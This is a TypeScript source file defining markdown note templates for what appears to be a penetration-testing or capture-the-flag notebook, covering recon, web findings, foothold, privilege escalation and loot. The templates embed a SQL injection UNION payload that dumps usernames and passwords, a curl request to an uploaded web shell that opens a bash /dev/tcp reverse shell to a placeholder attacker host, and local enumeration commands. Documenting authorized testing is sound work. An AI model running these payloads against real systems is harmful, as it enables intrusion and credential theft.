export interface NoteTemplate {
  id: string;
  title: string;
  description: string;
  category: 'recon' | 'exploit' | 'privesc' | 'loot' | 'ad';
  icon: string;
  content: string;
}

export const NOTE_TEMPLATES: NoteTemplate[] = [
  {
    id: 'recon-scan',
    title: 'Recon & Port Scan',
    description: 'Nmap quick/full scan, open ports table, and web discovery checklist',
    category: 'recon',
    icon: 'Radar',
    content: `# Recon & Initial Enumeration: {TARGET}

> [!NOTE] Target Context
> **RHOST**: \`{TARGET}\` | **Domain**: \`{DOMAIN}\` | **OS**: Unknown / Linux / Windows

## Port Scan Matrix

| Port | Service | Version | Status | Notes |
|---|---|---|---|---|
| 22/tcp | SSH | OpenSSH | Open | Check banner, version exploits |
| 80/tcp | HTTP | Apache/Nginx | Open | Web root inspection |
| 445/tcp | SMB | Samba/Windows | Open | Null session / anonymous shares |

## Execution Commands

\`\`\`bash
# Fast SYN scan of top 1000 ports
nmap -sC -sV -oN nmap-initial.txt {TARGET}

# Full TCP port scan in background
nmap -p- --min-rate 1000 -oN nmap-allports.txt {TARGET}

# Web directory enumeration
gobuster dir -u http://{TARGET}/ -w /usr/share/wordlists/dirb/common.txt -t 30 -o gobuster.txt
\`\`\`

## Initial Findings
- [ ] Check robots.txt and page source comments
- [ ] Inspect web server HTTP headers
- [ ] Enumerate virtual hosts / subdomains
- [ ] Test default credentials on active services
`
  },
  {
    id: 'web-findings',
    title: 'Web Application Findings',
    description: 'Vulnerability discovery, parameters, payloads, and reproduction steps',
    category: 'exploit',
    icon: 'Globe',
    content: `# Web Application Findings: {TARGET}

> [!TIP] Objective
> Document input vectors, authentication controls, and injection vulnerabilities.

## Target Endpoints

| Method | Endpoint | Parameters | Auth Required | Finding |
|---|---|---|---|---|
| GET | \`/api/v1/users\` | \`id\`, \`role\` | No | IDOR / user leak |
| POST | \`/login.php\` | \`username\`, \`password\` | No | SQLi / bypass |

## Exploit PoC / Request
\`\`\`http
POST /api/v1/search HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{
  "query": "' UNION SELECT null, username, password FROM users--"
}
\`\`\`

## Observations & Next Steps
- [ ] Verify if WAF or rate limiting is enabled
- [ ] Test file upload restrictions (magic bytes, double extension)
- [ ] Extract backend database version and privileges
`
  },
  {
    id: 'foothold-user',
    title: 'Foothold & User Flag',
    description: 'Vulnerability exploit, reverse shell callback, and user.txt proof',
    category: 'exploit',
    icon: 'Terminal',
    content: `# Foothold & User Flag: {TARGET}

> [!IMPORTANT] Compromise Vector
> **Vulnerability**: Remote Code Execution (CVE-XXXX-XXXX)
> **Callback**: \`{LHOST}:{LPORT}\`

## Exploitation Command
\`\`\`bash
# Start listener on attack machine
nc -lvnp {LPORT}

# Reverse shell trigger
curl -X POST "http://{TARGET}/upload/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{LHOST}/{LPORT}+0>%261'"
\`\`\`

## User Proof
- **User Account**: \`local-user\`
- **Home Directory**: \`/home/local-user\`
- **user.txt Flag**:
\`\`\`text
[INSERT_USER_FLAG_HERE]
\`\`\`

## Shell Stabilization Checklist
- [ ] \`python3 -c 'import pty; pty.spawn("/bin/bash")'\`
- [ ] \`Ctrl+Z\` then \`stty raw -echo; fg; reset\`
- [ ] \`export TERM=xterm-256color; export SHELL=/bin/bash\`
- [ ] Check local sudo permissions (\`sudo -l\`)
`
  },
  {
    id: 'privesc-checklist',
    title: 'Privilege Escalation Checklist',
    description: 'Linux / Windows local enumeration, automated scripts, and root.txt proof',
    category: 'privesc',
    icon: 'Shield',
    content: `# Privilege Escalation & Root Flag: {TARGET}

> [!WARNING] Post-Exploitation Checklist
> Systematically verify local privilege escalation vectors before running noisy automated scripts.

## Fast Local Enumeration
\`\`\`bash
# Check sudo permissions
sudo -l

# Search SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check internal listening ports
ss -tulpn | grep 127.0.0.1

# Crontab and scheduled tasks
cat /etc/crontab /etc/cron.*/* 2>/dev/null
\`\`\`

## Checklist
- [ ] Verify current kernel version (\`uname -a\`)
- [ ] Review password reuse across local users
- [ ] Check writeable files in \`/etc/\` and \`/opt/\`
- [ ] Inspect automated cron jobs or systemd services
- [ ] Run LinPEAS / WinPEAS review

## Root Flag
- **Privilege Obtained**: \`root\` / \`NT AUTHORITY\\SYSTEM\`
- **Proof Command**: \`id && hostname\`
- **root.txt Flag**:
\`\`\`text
[INSERT_ROOT_FLAG_HERE]
\`\`\`
`
  },
  {
    id: 'loot-vault',
    title: 'Loot & Credentials Vault',
    description: 'Extracted hashes, cleartext credentials, tokens, and SSH private keys',
    category: 'loot',
    icon: 'Key',
    content: `# Loot & Credentials Vault: {TARGET}

> [!NOTE] Operator Credentials
> Store all recovered credentials, hashes, and tokens for lateral movement.

## Discovered Credentials

| Service | Username | Password / Hash | Cracked Plaintext | Privilege |
|---|---|---|---|---|
| SSH / Linux | operator | \`$6$xyz...\` | \`Summer2026!\` | Low-priv |
| MySQL | db_admin | \`admin123\` | \`admin123\` | DBA |
| SMB | administrator | \`aad3b435b51404eeaad3b435b51404ee:...\` | (NTLM) | Domain Admin |

## Recovered SSH Private Key
\`\`\`text
-----BEGIN OPENSSH PRIVATE KEY-----
[PASTE_KEY_HERE]
-----END OPENSSH PRIVATE KEY-----
\`\`\`
`
  }
];
